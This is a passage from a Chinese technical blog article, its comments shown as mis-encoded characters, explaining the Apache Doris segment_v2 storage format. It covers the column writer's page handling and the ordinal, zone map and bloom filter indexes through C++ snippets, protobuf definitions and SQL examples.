        <span class="hljs-keyword">if</span> (_null_bitmap_builder != <span class="hljs-literal">nullptr</span> &amp;&amp; _null_bitmap_builder-&gt;<span class="hljs-built_in">has_null</span>()) {
            <span class="hljs-built_in">RETURN_IF_ERROR</span>(_null_bitmap_builder-&gt;<span class="hljs-built_in">finish</span>(&amp;nullmap));
            body.<span class="hljs-built_in">push_back</span>(nullmap.<span class="hljs-built_in">slice</span>());
            _null_bitmap_builder-&gt;<span class="hljs-built_in">reset</span>();
        }
        
        <span class="hljs-comment">// 4. æ„é€  Page Footer</span>
        <span class="hljs-function">std::unique_ptr&lt;Page&gt; <span class="hljs-title">page</span><span class="hljs-params">(<span class="hljs-keyword">new</span> Page())</span></span>;
        page-&gt;footer.<span class="hljs-built_in">set_type</span>(DATA_PAGE);
        page-&gt;footer.<span class="hljs-built_in">set_uncompressed_size</span>(Slice::<span class="hljs-built_in">compute_total_size</span>(body));
        <span class="hljs-keyword">auto</span>* data_page_footer = page-&gt;footer.<span class="hljs-built_in">mutable_data_page_footer</span>();
        data_page_footer-&gt;<span class="hljs-built_in">set_first_ordinal</span>(_first_rowid);
        data_page_footer-&gt;<span class="hljs-built_in">set_num_values</span>(_next_rowid - _first_rowid);
        data_page_footer-&gt;<span class="hljs-built_in">set_nullmap_size</span>(nullmap.<span class="hljs-built_in">slice</span>().size);
        
        <span class="hljs-comment">// 5. å‹ç¼© Page Body</span>
        OwnedSlice compressed_body;
        <span class="hljs-built_in">RETURN_IF_ERROR</span>(PageIO::<span class="hljs-built_in">compress_page_body</span>(_compress_codec, 
                                                   _opts.compression_min_space_saving,
                                                   body, &amp;compressed_body));
        <span class="hljs-keyword">if</span> (compressed_body.<span class="hljs-built_in">slice</span>().<span class="hljs-built_in">empty</span>()) {
            <span class="hljs-comment">// æœªå‹ç¼©</span>
            page-&gt;data.<span class="hljs-built_in">emplace_back</span>(std::<span class="hljs-built_in">move</span>(encoded_values));
            page-&gt;data.<span class="hljs-built_in">emplace_back</span>(std::<span class="hljs-built_in">move</span>(nullmap));
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// å·²å‹ç¼©</span>
            page-&gt;data.<span class="hljs-built_in">emplace_back</span>(std::<span class="hljs-built_in">move</span>(compressed_body));
        }
        
        <span class="hljs-comment">// 6. ä¿å­˜ Page</span>
        _push_back_page(std::<span class="hljs-built_in">move</span>(page));
        _first_rowid = _next_rowid;
        <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
    }
    
    <span class="hljs-comment">// å®Œæˆåˆ—å†™å…¥</span>
    <span class="hljs-function">Status <span class="hljs-title">finish</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span> </span>{
        <span class="hljs-built_in">RETURN_IF_ERROR</span>(<span class="hljs-built_in">finish_current_page</span>());
        _opts.meta-&gt;<span class="hljs-built_in">set_num_rows</span>(_next_rowid);
        <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
    }
    
    <span class="hljs-comment">// å†™å…¥æ•°æ® Pages</span>
    <span class="hljs-function">Status <span class="hljs-title">write_data</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span> </span>{
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; page : _pages) {
            <span class="hljs-built_in">RETURN_IF_ERROR</span>(_write_data_page(page.<span class="hljs-built_in">get</span>()));
        }
        _pages.<span class="hljs-built_in">clear</span>();
        
        <span class="hljs-comment">// å†™å…¥å­—å…¸é¡µï¼ˆå¦‚æœä½¿ç”¨å­—å…¸ç¼–ç ï¼‰</span>
        <span class="hljs-keyword">if</span> (_encoding_info-&gt;<span class="hljs-built_in">encoding</span>() == DICT_ENCODING) {
            OwnedSlice dict_body;
            <span class="hljs-built_in">RETURN_IF_ERROR</span>(_page_builder-&gt;<span class="hljs-built_in">get_dictionary_page</span>(&amp;dict_body));
            PageFooterPB footer;
            footer.<span class="hljs-built_in">set_type</span>(DICTIONARY_PAGE);
            footer.<span class="hljs-built_in">set_uncompressed_size</span>(dict_body.<span class="hljs-built_in">slice</span>().<span class="hljs-built_in">get_size</span>());
            PagePointer dict_pp;
            <span class="hljs-built_in">RETURN_IF_ERROR</span>(PageIO::<span class="hljs-built_in">compress_and_write_page</span>(_compress_codec, 
                                                            _opts.compression_min_space_saving,
                                                            _file_writer, {dict_body.<span class="hljs-built_in">slice</span>()}, 
                                                            footer, &amp;dict_pp));
            dict_pp.<span class="hljs-built_in">to_proto</span>(_opts.meta-&gt;<span class="hljs-built_in">mutable_dict_page</span>());
        }
        <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
    }
    
    <span class="hljs-comment">// å†™å…¥ Ordinal Index</span>
    <span class="hljs-function">Status <span class="hljs-title">write_ordinal_index</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span> </span>{
        <span class="hljs-keyword">return</span> _ordinal_index_builder-&gt;<span class="hljs-built_in">finish</span>(_file_writer, _opts.meta-&gt;<span class="hljs-built_in">add_indexes</span>());
    }
    
    <span class="hljs-comment">// å†™å…¥ Zone Map</span>
    <span class="hljs-function">Status <span class="hljs-title">write_zone_map</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span> </span>{
        <span class="hljs-keyword">if</span> (_opts.need_zone_map) {
            <span class="hljs-keyword">return</span> _zone_map_index_builder-&gt;<span class="hljs-built_in">finish</span>(_file_writer, _opts.meta-&gt;<span class="hljs-built_in">add_indexes</span>());
        }
        <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
    }
    
    <span class="hljs-comment">// å†™å…¥ Bitmap Index</span>
    <span class="hljs-function">Status <span class="hljs-title">write_bitmap_index</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span> </span>{
        <span class="hljs-keyword">if</span> (_opts.need_bitmap_index) {
            <span class="hljs-keyword">return</span> _bitmap_index_builder-&gt;<span class="hljs-built_in">finish</span>(_file_writer, _opts.meta-&gt;<span class="hljs-built_in">add_indexes</span>());
        }
        <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
    }
    
    <span class="hljs-comment">// å†™å…¥ Bloom Filter</span>
    <span class="hljs-function">Status <span class="hljs-title">write_bloom_filter_index</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span> </span>{
        <span class="hljs-keyword">if</span> (_opts.need_bloom_filter) {
            <span class="hljs-keyword">return</span> _bloom_filter_index_builder-&gt;<span class="hljs-built_in">finish</span>(_file_writer, _opts.meta-&gt;<span class="hljs-built_in">add_indexes</span>());
        }
        <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
    }
};
</code></pre>
<h3 data-id="heading-37">6.3 å†™å…¥æ—¶åºå›¾</h3>
<pre><code class="hljs language-scss" lang="scss">Client
  â”‚
  â”œâ”€â†’ <span class="hljs-built_in">append_data</span>() â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚                           â”‚
  â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚   â”‚      append_data_in_current_page   â”‚
  â”‚   â”‚                                     â”‚
  â”‚   â”‚  <span class="hljs-number">1</span>. _page_builder-&gt;<span class="hljs-built_in">add</span>()           â”‚
  â”‚   â”‚  <span class="hljs-number">2</span>. _bitmap_index_builder-&gt;<span class="hljs-built_in">add</span>()   â”‚
  â”‚   â”‚  <span class="hljs-number">3</span>. _zone_map_index_builder-&gt;<span class="hljs-built_in">add</span>() â”‚
  â”‚   â”‚  <span class="hljs-number">4</span>. _bloom_filter_index_builder-&gt;<span class="hljs-built_in">add</span>() â”‚
  â”‚   â”‚  <span class="hljs-number">5</span>. _null_bitmap_builder-&gt;<span class="hljs-built_in">add_run</span>()â”‚
  â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
  â”‚                 â”‚
  â”‚                 â”‚ <span class="hljs-selector-attr">[Page Full?]</span>
  â”‚                 â”‚
  â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚   â”‚   <span class="hljs-built_in">finish_current_page</span>()    â”‚
  â”‚   â”‚                            â”‚
  â”‚   â”‚  <span class="hljs-number">1</span>. _page_builder-&gt;<span class="hljs-built_in">finish</span>() â”‚
  â”‚   â”‚  <span class="hljs-number">2</span>. <span class="hljs-built_in">compress_page_body</span>()   â”‚
  â”‚   â”‚  <span class="hljs-number">3</span>. <span class="hljs-built_in">_push_back_page</span>()      â”‚
  â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
  â”‚                 â”‚
  â”‚â—„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
  â”‚
  â”œâ”€â†’ <span class="hljs-built_in">finish</span>() â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚                            â”‚
  â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”
  â”‚   â”‚   <span class="hljs-built_in">finish_current_page</span>()    â”‚
  â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”˜
  â”‚                            â”‚
  â”‚â—„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
  â”‚
  â”œâ”€â†’ <span class="hljs-built_in">write_data</span>() â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚                            â”‚
  â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”
  â”‚   â”‚  For each page:             â”‚
  â”‚   â”‚    <span class="hljs-built_in">_write_data_page</span>()       â”‚
  â”‚   â”‚  If dict encoding:          â”‚
  â”‚   â”‚    write dictionary page    â”‚
  â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜
  â”‚                            â”‚
  â”‚â—„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
  â”‚
  â”œâ”€â†’ <span class="hljs-built_in">write_ordinal_index</span>() â”€â”€â”€â”
  â”œâ”€â†’ <span class="hljs-built_in">write_zone_map</span>() â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
  â”œâ”€â†’ <span class="hljs-built_in">write_bitmap_index</span>() â”€â”€â”€â”€â”€â”¤
  â””â”€â†’ <span class="hljs-built_in">write_bloom_filter_index</span>()â”˜
</code></pre>
<hr/>
<h2 data-id="heading-38">7. ç´¢å¼•ç»“æ„</h2>
<h3 data-id="heading-39">7.1 Ordinal Indexï¼ˆåºå·ç´¢å¼•ï¼‰</h3>
<p><strong>ä½œç”¨</strong>ï¼šå¿«é€Ÿå®šä½æŒ‡å®šè¡Œå·ï¼ˆordinalï¼‰æ‰€åœ¨çš„ Pageã€‚</p>
<p><strong>ç»“æ„</strong>ï¼šB-Tree ç´¢å¼•ï¼Œå¶å­èŠ‚ç‚¹å­˜å‚¨ (first_ordinal, PagePointer) å¯¹ã€‚</p>
<p><strong>ä»£ç ä½ç½®</strong>ï¼š<code>be/src/olap/rowset/segment_v2/ordinal_page_index.h</code></p>
<h4 data-id="heading-40">æ•°æ®ç»“æ„</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">OrdinalIndexReader</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-comment">// æŸ¥æ‰¾å°äºç­‰äº ordinal çš„æœ€å¤§å…ƒç´ </span>
    <span class="hljs-function">OrdinalPageIndexIterator <span class="hljs-title">seek_at_or_before</span><span class="hljs-params">(<span class="hljs-type">ordinal_t</span> ordinal)</span></span>;
    
    <span class="hljs-function"><span class="hljs-type">ordinal_t</span> <span class="hljs-title">get_first_ordinal</span><span class="hljs-params">(<span class="hljs-type">int</span> page_index)</span> <span class="hljs-type">const</span> </span>{ 
        <span class="hljs-keyword">return</span> _ordinals[page_index]; 
    }
    
    <span class="hljs-function"><span class="hljs-type">ordinal_t</span> <span class="hljs-title">get_last_ordinal</span><span class="hljs-params">(<span class="hljs-type">int</span> page_index)</span> <span class="hljs-type">const</span> </span>{ 
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">get_first_ordinal</span>(page_index + <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; 
    }
    
<span class="hljs-keyword">private</span>:
    std::vector&lt;<span class="hljs-type">ordinal_t</span>&gt; _ordinals;      <span class="hljs-comment">// _ordinals[i] = ç¬¬ i ä¸ª Page çš„èµ·å§‹è¡Œå·</span>
    std::vector&lt;PagePointer&gt; _pages;       <span class="hljs-comment">// _pages[i] = ç¬¬ i ä¸ª Page çš„æŒ‡é’ˆ</span>
};
</code></pre>
<h4 data-id="heading-41">ä½¿ç”¨ç¤ºä¾‹</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// è¯»å–ç¬¬ 100-200 è¡Œ</span>
OrdinalIndexReader ordinal_index;
ordinal_index.<span class="hljs-built_in">load</span>(...);

<span class="hljs-comment">// 1. å®šä½èµ·å§‹ Page</span>
<span class="hljs-keyword">auto</span> iter = ordinal_index.<span class="hljs-built_in">seek_at_or_before</span>(<span class="hljs-number">100</span>);
<span class="hljs-type">int</span> start_page_idx = iter.<span class="hljs-built_in">page_index</span>();
<span class="hljs-type">ordinal_t</span> start_offset = <span class="hljs-number">100</span> - ordinal_index.<span class="hljs-built_in">get_first_ordinal</span>(start_page_idx);

<span class="hljs-comment">// 2. è¯»å– Pages</span>
<span class="hljs-keyword">while</span> (rows_read &lt; <span class="hljs-number">100</span>) {
    PagePointer pp = ordinal_index.<span class="hljs-built_in">get_page</span>(start_page_idx);
    <span class="hljs-comment">// è¯»å– Page å¹¶è§£ç </span>
    PageHandle page_handle;
    PageIO::<span class="hljs-built_in">read_and_decompress_page</span>(..., &amp;page_handle);
    PageDecoder* decoder = <span class="hljs-built_in">create_page_decoder</span>(page_handle.<span class="hljs-built_in">data</span>());
    decoder-&gt;<span class="hljs-built_in">seek_to_position_in_page</span>(start_offset);
    decoder-&gt;<span class="hljs-built_in">next_batch</span>(&amp;batch_size, &amp;column_block);
    
    rows_read += batch_size;
    start_page_idx++;
    start_offset = <span class="hljs-number">0</span>;  <span class="hljs-comment">// åç»­ Page ä»å¤´è¯»</span>
}
</code></pre>
<hr/>
<h3 data-id="heading-42">7.2 Zone Map Indexï¼ˆåŒºé—´ç»Ÿè®¡ç´¢å¼•ï¼‰</h3>
<p><strong>ä½œç”¨</strong>ï¼šå¿«é€Ÿè¿‡æ»¤ä¸æ»¡è¶³æ¡ä»¶çš„ Page å’Œ Segmentã€‚</p>
<p><strong>ç»“æ„</strong>ï¼š</p>
<ul>
<li><strong>Segment-level Zone Map</strong>ï¼šæ•´ä¸ª Segment çš„ Min/Max å€¼</li>
<li><strong>Page-level Zone Maps</strong>ï¼šæ¯ä¸ª Page çš„ Min/Max å€¼ï¼Œå­˜å‚¨åœ¨ IndexedColumn ä¸­</li>
</ul>
<p><strong>Protobuf å®šä¹‰</strong>ï¼š<a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="><code>segment_v2.proto:128-145, 301-306</code></a></p>
<pre><code class="hljs language-protobuf" lang="protobuf">message ZoneMapPB {
    optional bytes min = 1;              // æœ€å°å€¼
    optional bytes max = 2;              // æœ€å¤§å€¼
    optional bool has_null = 3;          // æ˜¯å¦åŒ…å« NULL
    optional bool has_not_null = 4;      // æ˜¯å¦åŒ…å«é NULL
    optional bool pass_all = 5;          // æ˜¯å¦åŒ…å«æ‰€æœ‰å€¼
    optional bool has_positive_inf = 6;  // æ˜¯å¦åŒ…å« +âˆ
    optional bool has_negative_inf = 7;  // æ˜¯å¦åŒ…å« -âˆ
    optional bool has_nan = 8;           // æ˜¯å¦åŒ…å« NaN
}

message ZoneMapIndexPB {
    optional ZoneMapPB segment_zone_map = 1;      // Segment çº§åˆ«
    optional IndexedColumnMetaPB page_zone_maps = 2; // Page çº§åˆ«
}
</code></pre>
<h4 data-id="heading-43">è¿‡æ»¤é€»è¾‘</h4>
<p><strong>ä»£ç ä½ç½®</strong>ï¼š<a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="><code>segment.cpp:230-271</code></a></p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// Segment çº§åˆ«è¿‡æ»¤</span>
<span class="hljs-function">Status <span class="hljs-title">Segment::new_iterator</span><span class="hljs-params">(SchemaSPtr schema, <span class="hljs-type">const</span> StorageReadOptions&amp; read_options,
                             std::unique_ptr&lt;RowwiseIterator&gt;* iter)</span> </span>{
    <span class="hljs-comment">// å°è¯•ç”¨ Segment-level Zone Map è¿‡æ»¤</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; entry : read_options.col_id_to_predicates) {
        <span class="hljs-type">int32_t</span> column_id = entry.first;
        std::shared_ptr&lt;ColumnReader&gt; reader;
        <span class="hljs-built_in">RETURN_IF_ERROR</span>(<span class="hljs-built_in">get_column_reader</span>(col, &amp;reader, read_options.stats));
        
        <span class="hljs-keyword">if</span> (reader-&gt;<span class="hljs-built_in">has_zone_map</span>()) {
            <span class="hljs-type">bool</span> matched = <span class="hljs-literal">true</span>;
            <span class="hljs-comment">// æ£€æŸ¥è°“è¯æ˜¯å¦æ»¡è¶³</span>
            <span class="hljs-built_in">RETURN_IF_ERROR</span>(reader-&gt;<span class="hljs-built_in">match_condition</span>(entry.second.<span class="hljs-built_in">get</span>(), &amp;matched));
            <span class="hljs-keyword">if</span> (!matched) {
                <span class="hljs-comment">// ä¸æ»¡è¶³ï¼Œè¿”å›ç©ºè¿­ä»£å™¨</span>
                *iter = std::<span class="hljs-built_in">make_unique</span>&lt;EmptySegmentIterator&gt;(*schema);
                read_options.stats-&gt;filtered_segment_number++;
                <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
            }
        }
    }
    
    <span class="hljs-comment">// åˆ›å»º Segment è¿­ä»£å™¨</span>
    *iter = std::<span class="hljs-built_in">make_unique</span>&lt;SegmentIterator&gt;(<span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">shared_from_this</span>(), schema);
    <span class="hljs-keyword">return</span> iter-&gt;<span class="hljs-built_in">get</span>()-&gt;<span class="hljs-built_in">init</span>(read_options);
}

<span class="hljs-comment">// Page çº§åˆ«è¿‡æ»¤ï¼ˆåœ¨ SegmentIterator ä¸­ï¼‰</span>
Status SegmentIterator::_init_iterators() {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; column_iterator : _column_iterators) {
        <span class="hljs-comment">// ä½¿ç”¨ Page-level Zone Map è·³è¿‡ä¸æ»¡è¶³çš„ Pages</span>
        column_iterator-&gt;<span class="hljs-built_in">prune_pages_by_zone_map</span>(predicates);
    }
}
</code></pre>
<h4 data-id="heading-44">å†™å…¥æµç¨‹</h4>
<p><strong>ä»£ç ä½ç½®</strong>ï¼š<a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="><code>zone_map_index.h</code></a></p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ZoneMapIndexWriter</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-comment">// æ·»åŠ å€¼ï¼Œæ›´æ–° Zone Map</span>
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">add_values</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span>* values, <span class="hljs-type">size_t</span> count)</span> </span>= <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// æ·»åŠ  NULL</span>
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">add_nulls</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> count)</span> </span>= <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// å®Œæˆå½“å‰ Page çš„ Zone Map</span>
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> Status <span class="hljs-title">flush</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// å†™å…¥ç´¢å¼•åˆ°æ–‡ä»¶</span>
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> Status <span class="hljs-title">finish</span><span class="hljs-params">(io::FileWriter* file_writer, ColumnIndexMetaPB* index_meta)</span> </span>= <span class="hljs-number">0</span>;
};

<span class="hljs-keyword">template</span> &lt;FieldType Type&gt;
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ZoneMapIndexWriterImpl</span> : <span class="hljs-keyword">public</span> ZoneMapIndexWriter {
<span class="hljs-keyword">private</span>:
    ZoneMap _page_zone_map;      <span class="hljs-comment">// å½“å‰ Page çš„ Zone Map</span>
    ZoneMap _segment_zone_map;   <span class="hljs-comment">// æ•´ä¸ª Segment çš„ Zone Map</span>
    std::vector&lt;ZoneMap&gt; _page_zone_maps; <span class="hljs-comment">// æ‰€æœ‰ Page çš„ Zone Map åˆ—è¡¨</span>
    
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add_values</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span>* values, <span class="hljs-type">size_t</span> count)</span> <span class="hljs-keyword">override</span> </span>{
        <span class="hljs-type">const</span> CppType* vals = (<span class="hljs-type">const</span> CppType*)values;
        <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; count; i++) {
            <span class="hljs-comment">// æ›´æ–° Page Zone Map</span>
            <span class="hljs-keyword">if</span> (!_page_zone_map.has_not_null || vals[i] &lt; *_page_zone_map.min_value) {
                *_page_zone_map.min_value = vals[i];
            }
            <span class="hljs-keyword">if</span> (!_page_zone_map.has_not_null || vals[i] &gt; *_page_zone_map.max_value) {
                *_page_zone_map.max_value = vals[i];
            }
            _page_zone_map.has_not_null = <span class="hljs-literal">true</span>;
            
            <span class="hljs-comment">// æ›´æ–° Segment Zone Map</span>
            <span class="hljs-keyword">if</span> (!_segment_zone_map.has_not_null || vals[i] &lt; *_segment_zone_map.min_value) {
                *_segment_zone_map.min_value = vals[i];
            }
            <span class="hljs-keyword">if</span> (!_segment_zone_map.has_not_null || vals[i] &gt; *_segment_zone_map.max_value) {
                *_segment_zone_map.max_value = vals[i];
            }
            _segment_zone_map.has_not_null = <span class="hljs-literal">true</span>;
        }
    }
    
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add_nulls</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> count)</span> <span class="hljs-keyword">override</span> </span>{
        _page_zone_map.has_null = <span class="hljs-literal">true</span>;
        _segment_zone_map.has_null = <span class="hljs-literal">true</span>;
    }
    
    <span class="hljs-function">Status <span class="hljs-title">flush</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span> </span>{
        <span class="hljs-comment">// ä¿å­˜å½“å‰ Page çš„ Zone Map</span>
        _page_zone_maps.<span class="hljs-built_in">push_back</span>(_page_zone_map);
        <span class="hljs-comment">// é‡ç½® Page Zone Map</span>
        _page_zone_map.<span class="hljs-built_in">reset</span>();
        <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
    }
    
    <span class="hljs-function">Status <span class="hljs-title">finish</span><span class="hljs-params">(io::FileWriter* file_writer, ColumnIndexMetaPB* index_meta)</span> <span class="hljs-keyword">override</span> </span>{
        <span class="hljs-comment">// 1. å†™å…¥ Segment-level Zone Map</span>
        <span class="hljs-keyword">auto</span>* zone_map_index = index_meta-&gt;<span class="hljs-built_in">mutable_zone_map_index</span>();
        _segment_zone_map.<span class="hljs-built_in">to_proto</span>(zone_map_index-&gt;<span class="hljs-built_in">mutable_segment_zone_map</span>(), _field);
        
        <span class="hljs-comment">// 2. å†™å…¥ Page-level Zone Mapsï¼ˆä½œä¸º IndexedColumnï¼‰</span>
        <span class="hljs-function">IndexedColumnWriter <span class="hljs-title">zone_map_column_writer</span><span class="hljs-params">(options, zone_map_type_info, file_writer)</span></span>;
        <span class="hljs-built_in">RETURN_IF_ERROR</span>(zone_map_column_writer.<span class="hljs-built_in">init</span>());
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; page_zone_map : _page_zone_maps) {
            ZoneMapPB zone_map_pb;
            page_zone_map.<span class="hljs-built_in">to_proto</span>(&amp;zone_map_pb, _field);
            std::string serialized;
            zone_map_pb.<span class="hljs-built_in">SerializeToString</span>(&amp;serialized);
            <span class="hljs-function">Slice <span class="hljs-title">slice</span><span class="hljs-params">(serialized)</span></span>;
            <span class="hljs-built_in">RETURN_IF_ERROR</span>(zone_map_column_writer.<span class="hljs-built_in">add</span>(&amp;slice));
        }
        <span class="hljs-built_in">RETURN_IF_ERROR</span>(zone_map_column_writer.<span class="hljs-built_in">finish</span>(zone_map_index-&gt;<span class="hljs-built_in">mutable_page_zone_maps</span>()));
        
        <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
    }
};
</code></pre>
<h4 data-id="heading-45">æŸ¥è¯¢ç¤ºä¾‹</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- å‡è®¾ age åˆ—çš„ Zone Map ä¸º [min=18, max=65]</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> age <span class="hljs-operator">&gt;</span> <span class="hljs-number">70</span>;
<span class="hljs-comment">-- âœ… Segment è¢«è¿‡æ»¤ï¼ˆ70 &gt; max=65ï¼‰</span>

<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> age <span class="hljs-operator">&gt;</span> <span class="hljs-number">50</span>;
<span class="hljs-comment">-- âš ï¸ Segment æ— æ³•è¿‡æ»¤ï¼ˆ50 &lt; max=65ï¼‰</span>
<span class="hljs-comment">-- ä½†éƒ¨åˆ† Page å¯èƒ½è¢«è¿‡æ»¤ï¼ˆPage Zone Map: [18, 30]ï¼‰</span>

<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> age <span class="hljs-keyword">BETWEEN</span> <span class="hljs-number">20</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">30</span>;
<span class="hljs-comment">-- âš ï¸ Segment æ— æ³•è¿‡æ»¤ï¼ˆ[20, 30] âˆ© [18, 65] â‰  âˆ…ï¼‰</span>
</code></pre>
<hr/>
<h3 data-id="heading-46">7.3 Bloom Filter Index</h3>
<p><strong>ä½œç”¨</strong>ï¼šå¿«é€Ÿåˆ¤æ–­å€¼æ˜¯å¦å­˜åœ¨ï¼Œé¿å…æ— æ•ˆçš„ I/Oã€‚</p>
<p><strong>ç‰¹ç‚¹</strong>ï¼š</p>
<ul>
<li><strong>ç©ºé—´é«˜æ•ˆ</strong>ï¼šä½¿ç”¨ä½æ•°ç»„å­˜å‚¨</li>
<li><strong>False Positive</strong>ï¼šå¯èƒ½è¯¯åˆ¤ä¸ºå­˜åœ¨ï¼ˆä½†ä¸ä¼šè¯¯åˆ¤ä¸ºä¸å­˜åœ¨ï¼‰</li>
<li><strong>é€‚åˆç­‰å€¼æŸ¥è¯¢</strong>ï¼š<code>=</code>, <code>IN</code></li>
</ul>
<p><strong>Protobuf å®šä¹‰</strong>ï¼š<a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="><code>segment_v2.proto:324-341</code></a></p>
<pre><code class="hljs language-protobuf" lang="protobuf">enum HashStrategyPB {
    HASH_MURMUR3_X64_64 = 0;
    CITY_HASH_64 = 1;
}

enum BloomFilterAlgorithmPB {
    BLOCK_BLOOM_FILTER = 0;      // åˆ†å— Bloom Filter
    CLASSIC_BLOOM_FILTER = 1;    // ç»å…¸ Bloom Filter
    NGRAM_BLOOM_FILTER = 2;      // N-Gram Bloom Filterï¼ˆå…¨æ–‡æ£€ç´¢ï¼‰
}

message BloomFilterIndexPB {
    optional HashStrategyPB hash_strategy = 1;
    optional BloomFilterAlgorithmPB algorithm = 2;
    optional IndexedColumnMetaPB bloom_filter = 3; // æ¯ä¸ª Page ä¸€ä¸ª Bloom Filter
}
</code></pre>
<h4 data-id="heading-47">å†™å…¥å®ç°</h4>
<p><strong>ä»£ç ä½ç½®</strong>ï¼š<code>be/src/olap/rowset/segment_v2/bloom_filter_index_writer.cpp</code></p>
